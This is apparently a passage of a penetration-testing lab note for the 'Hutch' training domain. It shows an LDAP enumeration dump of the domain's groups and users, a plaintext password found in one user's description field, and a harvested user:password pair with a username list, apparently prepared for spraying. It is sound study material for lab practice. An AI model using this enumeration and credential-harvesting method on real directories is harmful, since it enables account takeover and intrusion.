+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12342
+memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offse
+ c
+uSNChanged: 12344
+name: Cert Publishers
+objectGUID:: 6pR13+h/v0CBSMnRpjymjA==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnBQIAAA==
+sAMAccountName: Cert Publishers
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Domain Admins, Users, hutch.offsec
+dn: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
+
+# Domain Users, Users, hutch.offsec
+dn: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Domain Users
+description: All domain users
+distinguishedName: CN=Domain Users,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12348
+memberOf: CN=Users,CN=Builtin,DC=hutch,DC=offsec
+uSNChanged: 12350
+name: Domain Users
+objectGUID:: 0zyAAvzt1UOKBKbf0N6FQQ==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAQIAAA==
+sAMAccountName: Domain Users
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Domain Guests, Users, hutch.offsec
+dn: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Domain Guests
+description: All domain guests
+distinguishedName: CN=Domain Guests,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12351
+memberOf: CN=Guests,CN=Builtin,DC=hutch,DC=offsec
+uSNChanged: 12353
+name: Domain Guests
+objectGUID:: 8IN1upAPCUqFJVGtzCE2ew==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnAgIAAA==
+sAMAccountName: Domain Guests
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Group Policy Creator Owners, Users, hutch.offsec
+dn: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Group Policy Creator Owners
+description: Members in this group can modify group policy for the domain
+member: CN=Administrator,CN=Users,DC=hutch,DC=offsec
+distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12354
+memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offse
+ c
+uSNChanged: 12391
+name: Group Policy Creator Owners
+objectGUID:: CC/2IAwkpk+RkSicEUmVCA==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnCAIAAA==
+sAMAccountName: Group Policy Creator Owners
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# RAS and IAS Servers, Users, hutch.offsec
+dn: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: RAS and IAS Servers
+description: Servers in this group can access remote access properties of user
+ s
+distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12357
+uSNChanged: 12359
+name: RAS and IAS Servers
+objectGUID:: jwjGdt4Qfk2M0XMn8FMiVg==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnKQIAAA==
+sAMAccountName: RAS and IAS Servers
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Allowed RODC Password Replication Group, Users, hutch.offsec
+dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Allowed RODC Password Replication Group
+description: Members in this group can have their passwords replicated to all 
+ read-only domain controllers in the domain
+distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=hutc
+ h,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12402
+uSNChanged: 12404
+name: Allowed RODC Password Replication Group
+objectGUID:: 5ErycQkHo02pMg1/xxJNIQ==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnOwIAAA==
+sAMAccountName: Allowed RODC Password Replication Group
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Denied RODC Password Replication Group, Users, hutch.offsec
+dn: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Denied RODC Password Replication Group
+description: Members in this group cannot have their passwords replicated to a
+ ny read-only domain controllers in the domain
+member: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
+member: CN=Group Policy Creator Owners,CN=Users,DC=hutch,DC=offsec
+member: CN=Domain Admins,CN=Users,DC=hutch,DC=offsec
+member: CN=Cert Publishers,CN=Users,DC=hutch,DC=offsec
+member: CN=Enterprise Admins,CN=Users,DC=hutch,DC=offsec
+member: CN=Schema Admins,CN=Users,DC=hutch,DC=offsec
+member: CN=Domain Controllers,CN=Users,DC=hutch,DC=offsec
+member: CN=krbtgt,CN=Users,DC=hutch,DC=offsec
+distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=hutch
+ ,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12405
+uSNChanged: 12433
+name: Denied RODC Password Replication Group
+objectGUID:: I0YqHi+34U+yrPKy8jL7YA==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnPAIAAA==
+sAMAccountName: Denied RODC Password Replication Group
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Read-only Domain Controllers, Users, hutch.offsec
+dn: CN=Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
+
+# Enterprise Read-only Domain Controllers, Users, hutch.offsec
+dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Enterprise Read-only Domain Controllers
+description: Members of this group are Read-Only Domain Controllers in the ent
+ erprise
+distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=hutc
+ h,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12429
+uSNChanged: 12431
+name: Enterprise Read-only Domain Controllers
+objectGUID:: xkuEQsOH+UekvpicNYDyqw==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGn8gEAAA==
+sAMAccountName: Enterprise Read-only Domain Controllers
+sAMAccountType: 268435456
+groupType: -2147483640
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Cloneable Domain Controllers, Users, hutch.offsec
+dn: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Cloneable Domain Controllers
+description: Members of this group that are domain controllers may be cloned.
+distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12440
+uSNChanged: 12442
+name: Cloneable Domain Controllers
+objectGUID:: IOOLFwbLHU+szn+H1kGShg==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnCgIAAA==
+sAMAccountName: Cloneable Domain Controllers
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Protected Users, Users, hutch.offsec
+dn: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: Protected Users
+description: Members of this group are afforded additional protections against
+  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
+ 298939 for more information.
+distinguishedName: CN=Protected Users,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052623.0Z
+whenChanged: 20201104052623.0Z
+uSNCreated: 12445
+uSNChanged: 12447
+name: Protected Users
+objectGUID:: mA4Fn/4sO0q/fsDXx5HOhg==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnDQIAAA==
+sAMAccountName: Protected Users
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 20201104052623.0Z
+dSCorePropagationData: 16010101000417.0Z
+
+# Key Admins, Users, hutch.offsec
+dn: CN=Key Admins,CN=Users,DC=hutch,DC=offsec
+
+# Enterprise Key Admins, Users, hutch.offsec
+dn: CN=Enterprise Key Admins,CN=Users,DC=hutch,DC=offsec
+
+# DnsAdmins, Users, hutch.offsec
+dn: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: DnsAdmins
+description: DNS Administrators Group
+distinguishedName: CN=DnsAdmins,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052702.0Z
+whenChanged: 20201104052702.0Z
+uSNCreated: 12486
+uSNChanged: 12488
+name: DnsAdmins
+objectGUID:: oohK2PE1PUydvjjBS/KBzw==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTQQAAA==
+sAMAccountName: DnsAdmins
+sAMAccountType: 536870912
+groupType: -2147483644
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# DnsUpdateProxy, Users, hutch.offsec
+dn: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: group
+cn: DnsUpdateProxy
+description: DNS clients who are permitted to perform dynamic updates on behal
+ f of some other clients (such as DHCP servers).
+distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104052702.0Z
+whenChanged: 20201104052702.0Z
+uSNCreated: 12491
+uSNChanged: 12491
+name: DnsUpdateProxy
+objectGUID:: QVU11mCC40GAeAjr+EUd7w==
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTgQAAA==
+sAMAccountName: DnsUpdateProxy
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Rosaline Placidi, Users, hutch.offsec
+dn: CN=Rosaline Placidi,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Rosaline Placidi
+distinguishedName: CN=Rosaline Placidi,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12759
+uSNChanged: 12763
+name: Rosaline Placidi
+objectGUID:: ZnXcaol0h0O06eCHssgsaw==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417051062737
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnTwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: rplacidi
+sAMAccountType: 805306368
+userPrincipalName: rplacidi@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Otto Patry, Users, hutch.offsec
+dn: CN=Otto Patry,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Otto Patry
+distinguishedName: CN=Otto Patry,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12765
+uSNChanged: 12769
+name: Otto Patry
+objectGUID:: Z/B36x+G7EKQOh7bdq2Gdg==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417052162728
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUAQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: opatry
+sAMAccountType: 805306368
+userPrincipalName: opatry@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Lyndsie Taunton, Users, hutch.offsec
+dn: CN=Lyndsie Taunton,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Lyndsie Taunton
+distinguishedName: CN=Lyndsie Taunton,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12771
+uSNChanged: 12775
+name: Lyndsie Taunton
+objectGUID:: osEKgirap0C06Opb/Wc8lQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417052642725
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: ltaunton
+sAMAccountType: 805306368
+userPrincipalName: ltaunton@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Arlyn Costello, Users, hutch.offsec
+dn: CN=Arlyn Costello,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Arlyn Costello
+distinguishedName: CN=Arlyn Costello,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12777
+uSNChanged: 12781
+name: Arlyn Costello
+objectGUID:: OdMef64Ah0apX2/LyqiHYA==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417053152725
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUgQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: acostello
+sAMAccountType: 805306368
+userPrincipalName: acostello@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Johnnie Sparwell, Users, hutch.offsec
+dn: CN=Johnnie Sparwell,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Johnnie Sparwell
+distinguishedName: CN=Johnnie Sparwell,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12783
+uSNChanged: 12787
+name: Johnnie Sparwell
+objectGUID:: y1RU3ceaqEyn1XecBNhkVQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417053772722
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnUwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: jsparwell
+sAMAccountType: 805306368
+userPrincipalName: jsparwell@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Ottilie Knee, Users, hutch.offsec
+dn: CN=Ottilie Knee,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Ottilie Knee
+distinguishedName: CN=Ottilie Knee,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12789
+uSNChanged: 12793
+name: Ottilie Knee
+objectGUID:: /bMvDx/e506T4lQ+rB8/FA==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417054332736
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVAQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: oknee
+sAMAccountType: 805306368
+userPrincipalName: oknee@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Joan McKendry, Users, hutch.offsec
+dn: CN=Joan McKendry,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Joan McKendry
+distinguishedName: CN=Joan McKendry,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12795
+uSNChanged: 12799
+name: Joan McKendry
+objectGUID:: awivgHuoDEKrRWtvGV31rQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417054922729
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: jmckendry
+sAMAccountType: 805306368
+userPrincipalName: jmckendry@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Alexia Victoria, Users, hutch.offsec
+dn: CN=Alexia Victoria,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Alexia Victoria
+distinguishedName: CN=Alexia Victoria,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12801
+uSNChanged: 12805
+name: Alexia Victoria
+objectGUID:: pYkiH0wnEUGtTvJmed1oTQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417055452791
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVgQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: avictoria
+sAMAccountType: 805306368
+userPrincipalName: avictoria@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Jane Frarey, Users, hutch.offsec
+dn: CN=Jane Frarey,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Jane Frarey
+distinguishedName: CN=Jane Frarey,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12807
+uSNChanged: 12811
+name: Jane Frarey
+objectGUID:: ixEEnk99f0WcwVSNK+e+oA==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417056032732
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnVwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: jfrarey
+sAMAccountType: 805306368
+userPrincipalName: jfrarey@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Editha Aburrow, Users, hutch.offsec
+dn: CN=Editha Aburrow,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Editha Aburrow
+distinguishedName: CN=Editha Aburrow,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12813
+uSNChanged: 12817
+name: Editha Aburrow
+objectGUID:: +7Byu5JQuU2TfrLSegT8VQ==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417056522726
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWAQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: eaburrow
+sAMAccountType: 805306368
+userPrincipalName: eaburrow@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Claus Luddy, Users, hutch.offsec
+dn: CN=Claus Luddy,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Claus Luddy
+distinguishedName: CN=Claus Luddy,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12819
+uSNChanged: 12823
+name: Claus Luddy
+objectGUID:: XXbxCiLxHkKjA7Pd0VTq1A==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417057032735
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: cluddy
+sAMAccountType: 805306368
+userPrincipalName: cluddy@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Arthur Gitthouse, Users, hutch.offsec
+dn: CN=Arthur Gitthouse,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Arthur Gitthouse
+distinguishedName: CN=Arthur Gitthouse,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20201104053505.0Z
+uSNCreated: 12825
+uSNChanged: 12829
+name: Arthur Gitthouse
+objectGUID:: PQ8QTFNtw0elgPkzWaOmHA==
+userAccountControl: 512
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132489417057602730
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWgQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: agitthouse
+sAMAccountType: 805306368
+userPrincipalName: agitthouse@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# Freddy McSorley, Users, hutch.offsec
+dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: Freddy McSorley
+description: Password set to CrabSharkJellyfish192 at user&apos;s request. Please c
+ hange on next login.
+distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
+instanceType: 4
+whenCreated: 20201104053505.0Z
+whenChanged: 20210216133934.0Z
+uSNCreated: 12831
+uSNChanged: 49179
+name: Freddy McSorley
+objectGUID:: TxilGIhMVkuei6KplCd8ug==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 132489437036308102
+lastLogoff: 0
+lastLogon: 132579563744834908
+pwdLastSet: 132489417058152751
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
+accountExpires: 9223372036854775807
+logonCount: 2
+sAMAccountName: fmcsorley
+sAMAccountType: 805306368
+userPrincipalName: fmcsorley@hutch.offsec
+objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
+dSCorePropagationData: 20201104053513.0Z
+dSCorePropagationData: 16010101000001.0Z
+lastLogonTimestamp: 132579563744834908
+msDS-SupportedEncryptionTypes: 0
+
+# Domain Administrator, Users, hutch.offsec
+dn: CN=Domain Administrator,CN=Users,DC=hutch,DC=offsec
+
+# search reference
+ref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec
+
+# search reference
+ref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec
+
+# search reference
+ref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 42
+# numEntries: 38
+# numReferences: 3</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">fmcsorley@hutch.offsec:CrabSharkJellyfish192
+
+
+agitthouse@hutch.offsec
+cluddy@hutch.offsec
+eaburrow@hutch.offsec
+jfrarey@hutch.offsec
+avictoria@hutch.offsec
+jmckendry@hutch.offsec
+oknee@hutch.offsec
+jsparwell@hutch.offsec
+acostello@hutch.offsec
+ltaunton@hutch.offsec
+opatry@hutch.offsec
+rplacidi@hutch.offsec</pre><pre class="hljs"><code>fmcsorley<span class="hljs-keyword">@hutch</span>.<span class="hljs-attribute">offsec</span>:CrabSharkJellyfish192
+
+
+agitthouse<span class="hljs-keyword">@hutch</span>.offsec
+cluddy<span class="hljs-keyword">@hutch</span>.offsec
+eaburrow<span class="hljs-keyword">@hutch</span>.offsec
+jfrarey<span class="hljs-keyword">@hutch</span>.offsec
+avictoria<span class="hljs-keyword">@hutch</span>.offsec
+jmckendry<span class="hljs-keyword">@hutch</span>.offsec
+oknee<span class="hljs-keyword">@hutch</span>.offsec
+jsparwell<span class="hljs-keyword">@hutch</span>.offsec
+acostello<span class="hljs-keyword">@hutch</span>.offsec
+ltaunton<span class="hljs-keyword">@hutch</span>.offsec
+opatry<span class="hljs-keyword">@hutch</span>.offsec
+rplacidi<span class="hljs-keyword">@hutch</span>.offsec</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Hutch]
